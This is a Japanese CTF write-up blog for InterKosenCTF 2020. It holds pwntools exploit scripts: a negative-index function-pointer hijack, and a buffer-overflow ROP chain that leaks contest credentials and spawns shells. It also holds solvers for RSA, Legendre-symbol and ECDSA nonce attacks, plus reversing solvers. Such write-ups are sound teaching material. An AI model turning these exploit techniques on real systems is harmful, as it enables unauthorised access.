---
title: "InterKosenCTF2020"
date: 2020-09-07T01:14:23+09:00
tags: ["writeup", "kosen"]
draft: false
mathjax: true
---

<div class="section">

InterKosenCTF 2020に，久しぶりにkaitoさんとチームStarrySkyで参加しました．結果は20位で少し残念でしたが，面白い問題が多くとても楽しめました．運営は3人しかいないらしくとても大変そうです．本当にお疲れ様でした．  
では自分が解いた問題のwirteupを書いていこうと思います．

<br>

# [pwn: 105pts] babysort (49 solved)
次のプログラムで動いているサービスがあります．

``` c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef int (*SORTFUNC)(const void*, const void*);

typedef struct {
  long elm[5];
  SORTFUNC cmp[2];
} SortExperiment;

/* call me! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}

int cmp_asc(const void *a, const void *b) { return *(long*)a - *(long*)b; }
int cmp_dsc(const void *a, const void *b) { return *(long*)b - *(long*)a; }

int main(void) {
  SortExperiment se = {.cmp = {cmp_asc, cmp_dsc}};
  int i;

  /* input numbers */
  puts("-*-*- Sort Experiment -*-*-");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = ", i);
    if (scanf("%ld", &se.elm[i]) != 1) exit(1);
  }

  /* sort */
  printf("[0] Ascending / [1] Descending: ");
  if (scanf("%d", &i) != 1) exit(1);
  qsort(se.elm, 5, sizeof(long), se.cmp[i]);

  /* output result */
  puts("Result:");
  for(i = 0; i < 5; i++) {
    printf("elm[%d] = %ld\n", i, se.elm[i]);
  }
  return 0;
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(300);
}
```

bofかなんかを利用してwin関数に飛べばフラグが取れる問題です．34行目にあるscanfで，負の数値を受け取ることができてしまうことを利用して，qsortのソート用の関数をwinのアドレスにすることで呼び出すことができます．  
  
構造体はそのメンバ順にメモリにマップされるため，se.cmpの一つ後ろのアドレスにse.elmの一番後ろのアドレスが位置しています．そのため，最初の入力でse.elmの一番最後の要素にwinのアドレスを入れておけば，se.cmp[-1]をqsortに渡すことでwinを呼び出すことができます．  
ソルバどぺー  

``` python
from pwn import *

win_addr = 0x00400787

r = remote("pwn.kosenctf.com", 9001)

r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline("0")
r.sendline(str(win_addr))
r.sendline("-1")

r.interactive()

# KosenCTF{f4k3_p01nt3r_l34ds_u_2_w1n}
```

<br>

# [pwn: 300pts] authme (20 solved)
次のコードで動いている実行ファイルと，ダミーのパスワードとユーザー名が渡されます．
``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int auth = 1;
char username[0x20];
char password[0x20];

void init(void) {
  FILE *fp;

  /* read secret username */
  if ((fp = fopen("./username", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(username, sizeof(char), 0x20, fp);
  fclose(fp);

  /* read secret password */
  if ((fp = fopen("./password", "r")) == NULL) {
    puts("[-] Please report this bug to the admin");
    exit(1);
  }
  fread(password, sizeof(char), 0x20, fp);
  fclose(fp);
}

int main() {
  char buf[0x20];

  init();

  puts("                _   _     __  __ ______ ");
  puts("     /\\        | | | |   |  \\/  |  ____|");
  puts("    /  \\  _   _| |_| |__ | \\  / | |__   ");
  puts("   / /\\ \\| | | | __| '_ \\| |\\/| |  __|  ");
  puts("  / ____ \\ |_| | |_| | | | |  | | |____ ");
  puts(" /_/    \\_\\__,_|\\__|_| |_|_|  |_|______|\n");

  printf("Username: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, username) != 0) auth = 0;

  printf("Password: ");
  if (fgets(buf, 0x40, stdin) == NULL) return 1;
  if (strcmp(buf, password) != 0) auth = 0;

  if (auth == 1) {
    puts("[+] OK!");
    system("/bin/sh");
    exit(0);
  } else {
    puts("[-] NG!");
    exit(1);
  }
}

__attribute__((constructor))
void setup(void) {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  alarm(60);
}
```

bufの容量が0x20なのにもかかわらず，43，47行目で0x40の長さの文字列が入力できてしまうのが脆弱性になっています．最初はこれに気づけなくて大変でした．    
  
一つ目のfgetsでbofを起こせます．bufの先頭からオフセット0x28の位置にリターンアドレスがあり，この部分でそれをを書き換えることができます．また，そのまま進むとauthが1でも0でもexitしてしまうためリターンアドレスに飛ぶことファできないため，2つ目のfgetsにnullを返させてreturn 1を実行できるようにします．  

1つ目のfgetsで，リターンアドレスを52行目のsystemに飛ばせばそのままシェルが取れるような気がしますが，実はこの部分のアドレスには0x0aが含まれています．これは改行文字でfgetsはそこで入力を終わりにしてしまい，52行目のアドレスを入力しきることができません．そのためpop rdiのガジェットを使ってusernameとpasswordをputsしリークすることを目指します．  
ソルバどぺー  
10行目のコメントを外せばパスワードが取れます．

``` python
from pwn import *

r = remote("pwn.kosenctf.com", 9002)

puts = 0x4006a6
username = 0x6020c0
password = 0x6020e0
pop_rdi = 0x400b03
payload = b"A" * 0x28 + p64(pop_rdi) + p64(username) + p64(puts)[:-1]
# payload = b"A" * 0x28 + p64(pop_rdi) + p64(password) + p64(puts)[:-1]
r.send(payload)

r.recvuntil("Password: ")
r.shutdown("send")

r.interactive()
# username: UnderUltimateUtterUranium
# password: PonPonPainPanicParadigm
# KosenCTF{cl0s3_ur_3y3_4nd_g0_w1th_th3_fl0w}
```

<br>

# [crypto: 201pts] ciphertexts (33 solved)
次のmulti-prime rsaのような暗号と，その出力結果が渡されました．
``` python
from Crypto.Util.number import *
import gmpy2
from flag import flag

p = getPrime(512)
q = getPrime(512)
r = getPrime(512)
n1 = p * q
n2 = p * q * r

e1 = getPrime(20)
e2 = int(gmpy2.next_prime(e1))

m = bytes_to_long(flag)
c1 = pow(m, e1, n1)
c2 = pow(m, e2, n2)

print("n1 = {}".format(n1))
print("n2 = {}".format(n2))
print("e1 = {}".format(e1))
print("e2 = {}".format(e2))
print()
print("c1 = {}".format(c1))
print("c2 = {}".format(c2))
```

フラグはそんなに長くないと思い$m < r$と予想して，法rの下で複合してあげたらフラグがでました．rの値は$n_2$を$n_1$で割ってあげれば出ます．
そるばどぺー

```
from Crypto.Util.number import *

n1 = 112027309284322736696115076630869358886830492611271994068413296220031576824816689091198353617581184917157891542298780983841631012944437383240190256425846911754031739579394796766027697768621362079507428010157604918397365947923851153697186775709920404789709337797321337456802732146832010787682176518192133746223
n2 = 1473529742325407185540416487537612465189869383161838138383863033575293817135218553055973325857269118219041602971813973919025686562460789946104526983373925508272707933534592189732683735440805478222783605568274241084963090744480360993656587771778757461612919160894779254758334452854066521288673310419198851991819627662981573667076225459404009857983025927477176966111790347594575351184875653395185719233949213450894170078845932168528522589013379762955294754168074749
r = n2 // n1
e1 = 745699
e2 = 745709

c1 = 23144512980313393199971544624329972186721085732480740903664101556117858633662296801717263237129746648060819811930636439097159566583505473503864453388951643914137969553861677535238877960113785606971825385842502989341317320369632728661117044930921328060672528860828028757389655254527181940980759142590884230818
c2 = 546013011162734662559915184213713993843903501723233626580722400821009012692777901667117697074744918447814864397339744069644165515483680946835825703647523401795417620543127115324648561766122111899196061720746026651004752859257192521244112089034703744265008136670806656381726132870556901919053331051306216646512080226785745719900361548565919274291246327457874683359783654084480603820243148644175296922326518199664119806889995281514238365234514624096689374009704546

dr = inverse_mod(e2, r - 1)
m = pow(c2 % r, dr, r)
print(m)

print(long_to_bytes(m))
# KosenCTF{HALDYN_D0M3}
```

<br>

# [crypto: 326pts] bitcrypto (17 solved)
"""hi!!!! flag!!!! here!!! wowowowowo~~~~~~""" ← これ好き

次のコードが動いているサーバーに接続してフラグを取る問題です．

``` python
from Crypto.Util.number import *
from secret import flag

def legendre_symbol(x, p):
    a = pow(x, (p-1) // 2, p)
    if a == 0:
        return 0
    elif a == 1:
        return 1
    else:
        return -1

def key_gen(bits):
    p = getPrime(bits)
    q = getPrime(bits)
    n = p * q

    while True:
        z = getRandomRange(2, n)
        a, b = legendre_symbol(z, p), legendre_symbol(z, q)
        if a == -1 and b == -1:
            break

    return (n, z), (p, q)

def enc(pubkey, m):
    n, z = pubkey
    bits = [int(b) for b in "{:b}".format(m)]

    c = []
    for b in bits:
        while True:
            x = getRandomRange(2, n)
            if GCD(x, n) == 1:
                break
        c.append( ((z**b) * (x**2)) % n )
    return c

def dec(privkey, c):
    p, q = privkey
    m = ""
    for b in c:
        if legendre_symbol(b, p) == 1 and legendre_symbol(b, q) == 1:
            m += "0"
        else:
            m += "1"
    return int(m, 2)

def main():

    keyword = "yoshiking, give me ur flag"
    m = input("your query: ")
    if any([c in keyword for c in m]):
        print("yoshiking: forbidden!")
        exit()

    if len(m) > 8:
        print("yoshiking: too long!")
        exit()

    c = enc(pubkey, bytes_to_long(m.encode()))
    print("token to order yoshiking: ", c)

    c = [int(x) for x in input("your token: ")[1:-1].split(",")]
    print(c)
    if len(c) != len(set(c)):
        print("yoshiking: invalid!")
        exit()

    if any([x < 0 for x in c]):
        print("yoshiking: wow good unintended-solution!")
        exit()

    m = long_to_bytes(dec(privkey, c))
    if m == keyword.encode():
        print("yoshiking: hi!!!! flag!!!! here!!! wowowowowo~~~~~~")
        print(flag)
    else:
        print(m)
        print("yoshiking: ...?")


if __name__ == '__main__':
    main()
```

ルジャンドル記号を利用した暗号に一つだけ平文を送ることができ，その暗号文を入手することができます．その後，複合した結果がkeywordの内容になるような暗号文を送って，それが正しければフラグがもらえるという内容です．
コードを読むと，暗号文は整数のリストで，各数値がその位置のビットの暗号文となっていることがわかります．わた複合処理を読むと，$p,q$の下でビットのフラグが平方剰余なら$0$に，そうでないなら$1$に複合されるようです．  

yoshikingさんにinvalidと言われないようにしながら，keywordをビット列に直したものの分の$0$と$1$を作ることができれば解くことができます．また，一度嵌ったのですがあまりに送信する文字列が長いと途中で区切られてしまい，your tokenで暗号文を送り切ることができなくなります．そのためできるだけ小さい数字を使う必要もあります．

複合したら$0$のビットになるような小さい数を作るのは簡単です．平方剰余，つまり平方根が存在してればいいため適当な平方数は全て$0$に複合されます．

次に，複合したら$1$になる数について考えます．これはルジャンドル記号が準同型であるのを利用すればよく，具体的には$$\left\(\frac{ab}{p}\right) = \left(\frac{a}{p}\right) \left(\frac{b}{p}\right)$$が成り立ちます．つまり，ルジャンドル記号が$-1$になるような数を一つ見つけることができれば，それに平方数をかけていくことで，次々に重複のない$1$に複合される数を作り出すことができます．それを並び替えてkeywordのビット列にすればフラグを入手することができます．

そるばどぺー
``` python
from pwn import *
import string
from Crypto.Util.number import *


target = "111100101101111011100110110100001101001011010110110100101101110011001110010110000100000011001110110100101110110011001010010000001101101011001010010000001110101011100100010000001100110011011000110000101100111"
  
test = b"1" * target.count("1") + b"0" * target.count("0")
print(target.count("1"))
print(target.count("0"))

r = remote("crypto.kosenctf.com", 13003)

r.sendline(b"\x02")

zeros = [1]
for i in range(2, target.count("0") + 2):
    zeros += [i ** 2]

ones = [2]
for i in range(2, target.count("1") + 2):
    ones += [2 * (i ** 2)]

solve = []
for i in target:
    if i == "1":
        solve += [ones[0]]
        ones = ones[1:]
    else:
        solve += [zeros[0]]
        zeros = zeros[1:]

r.sendline(str(solve).replace(" ", ""))

r.interactive()
# KosenCTF{yoshiking_is_clever_and_wild_god_of_crypt}
```

<br>

# [crypto: 383pts] ochazuke (11 solved)

次のsageのコードが動いているサーバーにアクセスできます．

```
from Crypto.Util.number import bytes_to_long
from binascii import unhexlify
from hashlib import sha1
import re

EC = EllipticCurve(
    GF(0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff),
    [-3, 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b]
)
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 # EC.order()
Zn = Zmod(n)
G = EC((0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
        0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5))

def sign(private_key, message):
    z = Zn(bytes_to_long(message))
    k = Zn(ZZ(sha1(message).hexdigest(), 16)) * private_key
    assert k != 0
    K = ZZ(k) * G
    r = Zn(K[0])
    assert r != 0
    s = (z + r * private_key) / k
    assert s != 0
    return (r, s)

def verify(public_key, message, signature):
    r, s = signature[0], signature[1]
    if r == 0 or s == 0:
        return False
    z = Zn(bytes_to_long(message))
    u1, u2 = z / s, r / s
    K = ZZ(u1) * G + ZZ(u2) * public_key
    if K == 0:
        return False
    return Zn(K[0]) == r

if __name__=="__main__":
    from secret import flag, d
    public_key = ZZ(d) * G
    print("public key:", public_key)
    
    your_msg = unhexlify(input("your message(hex): "))
    if len(your_msg) < 10 or b"ochazuke" in your_msg:
        print("byebye")
        exit()
    your_sig = sign(d, your_msg)
    print("your signature:", your_sig)

    sig = input("please give me ochazuke's signature: ")
    r, s = map(Zn, re.compile("\((\d+), (\d+)\)").findall(sig)[0])
    if verify(public_key, b"ochazuke", (r, s)):
        print("thx!", flag)
    else:
        print("it's not ochazuke :(")
```

楕円曲線を利用したシグネチャの処理を行っていて，最初に公開鍵が与えられます．その後適当な(hexlifyした)文字列のシグネチャを計算してくれます．最後にその公開鍵での"ochazuke"のシグネチャを検証し，それが通ればフラグが手に入ります．

実はこの問題のシグネチャは，17行目の$k$の値に脆弱性があります．本来の楕円曲線のシグネチャは乱数をかける必要がありますが，この問題では秘密鍵$d$がかけられています，そのため適当な平文とそのシグネチャがわかっていれば秘密鍵の値を計算することができ，"ochazuke"のシグネチャも簡単に求まってしまいます．

具体的には，$d = \frac{m}{hash \cdot s - r} \mod n$です．というわけでそるばどぺー

```
from Crypto.Util.number import bytes_to_long
from binascii import unhexlify
from hashlib import sha1

EC = EllipticCurve(
    GF(0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff),
    [-3, 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b]
)
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551 # EC.order()
Zn = Zmod(n)
G = EC((0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
        0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5))

msg = b"ohayougozaimasu"

print("ohayougozaimasu_hash")
r = ZZ(input("r: "))
s = ZZ(input("s: "))
h = Zn(ZZ(sha1(msg).hexdigest(), 16))

d = (bytes_to_long(msg) * (h * s - r) ** (-1)) % n

print("d: {}".format(d))
# d = 313681195146870630150443675574660225833


def sign(private_key, message):
    z = Zn(bytes_to_long(message))
    k = Zn(ZZ(sha1(message).hexdigest(), 16)) * private_key
    assert k != 0
    K = ZZ(k) * G
    r = Zn(K[0])
    assert r != 0
    s = (z + r * private_key) / k
    assert s != 0
    return (r, s)

target = b"ochazuke"
r, s = sign(d, target)
print()
print("ochazuke_signature")
print("r: {}".format(r))
print("s: {}".format(s))

# KosenCTF{ahhhh_ochazuke_oisi_geho!geho!!gehun!..oisii...}
```

your messageにhexlify(b"ohayougozaimasu")を送り，そのシグネチャをこの計算プログラムに入力すればochazukeのシグネチャが計算されます．この問題，あまり楕円曲線要素がなくただの法の下の計算みたいな感じだったので少し残念でした．でも面白かったです！

<br>

# [reversing: 182pts] harmagedon (36 solved)

ELFのバイナリが与えられます．実行するとwhich is your choice? [fRD3]みたいな感じで何度も聞かれ，正しいアルファベットを選択していくとフラグが手に入るプログラムです．

頑張ってバイナリを読むと，$i$番目に選択したアルファベットのインデックス(例えば[fRd3]でRなら1)を$a_i$とすると，次のような漸化式と制約でフラグかどうか判別しているようでした．

$$x_1 = 0,\ x_{i+1} = 4(x_i + a_i + 1)$$
$$\exists j \leq 11,\ x_j = 12024956$$

$j = 11$と予想して次のソルバで$a_i$を求めていきました．

``` python
def calc(ps):
    if len(ps) == 1:
        return 4 * (ps[0] + 1)

    return 4 * (calc(ps[1:]) + ps[0] + 1)

for a in range(4):
    for b in range(4):
        for c in range(4):
            for d in range(4):
                for e in range(4):
                    for f in range(4):
                        for g in range(4):
                            for h in range(4):
                                for i in range(4):
                                    for j in range(4):
                                        for k in range(4):
                                            xxx = [a,b,c,d,e,f,g,h,i,j,k]
                                            m = calc(xxx[::])
                                            print(m)
                                            if m == 0xb77c7c:
                                                print(list(reversed(xxx)))
                                                exit(1)
# [1, 2, 0, 2, 0, 2, 1, 3, 0, 2, 2]
# KosenCTF{Ruktun0rDi3}
```

<br>

# [reversing: 182pts] in question (36 solved)
ELFのバイナリが与えられています．コマンドライン引数にフラグを入力し，それがあってるか判別してくれるようです．頑張ってバイナリを読んでpythonでシミュレートすればフラグが取れます．

そるばどぺー

``` python
from pwn import *

datas = [0xdb, 0xe2, 0xeb, 0xf7, 0xd6, 0xed, 0xeb, 0xc5, 0xe8, 0xa2, 0xab, 0xee, 0xd8, 0xc1, 0xae, 0xb7, 0xc4, 0xc5, 0xf1, 0xb0, 0xab, 0xc1, 0xd0, 0xbe, 0xe7, 0xba, 0xd6, 0xce, 0xeb, 0x9f]

flags = [ord("K")]

for i in range(len(datas)):
    flags.append(flags[-1]^datas[i]^i^0xff)

for i in flags:
    print(chr(i), end="")

# KosenCTF{d0nt_l3t_th4t_f00l_u}
```

<br>

# [reversing: 252pts] trilemma (26 solved)
複数の共有ライブラリとソースコードが渡されます．ソースコードにはそのコンパイル方法も記載されていて丁寧だと感じました．  
実行してみると各ライブラリのflag関数からエラーが出ます．エラーの文章からdl_iterate_phdrとlookupで落ちているようでした，ということで各ライブラリのlookup関数の中身を編集し，ライブラリの存在の有無でデータに1を書き込んでいる部分を0を書き込むように直しました．これは直接バイナリエディタでアセンブリをいじっています．

また，その後実行してもまたエラーで落ちます．そのエラーは，先程のエラーを回避するために0を代入したのに，そのデータの値が0であるときに発生するエラーでした．ということでそのジャンプ命令を変更してあげてそこもパスできるように編集しました．

その後またエラーが発生します．フラグを生成する部分のバッファのアドレスをmmapするとき，各ライブラリが使う部分が競合してしまっていました．gdbで頑張って色々命令を飛ばしながら動かすとフラグの断片が色々手に入るので，それを組みわせればオッケーです．

フラグは忘れちゃいました．

</div>
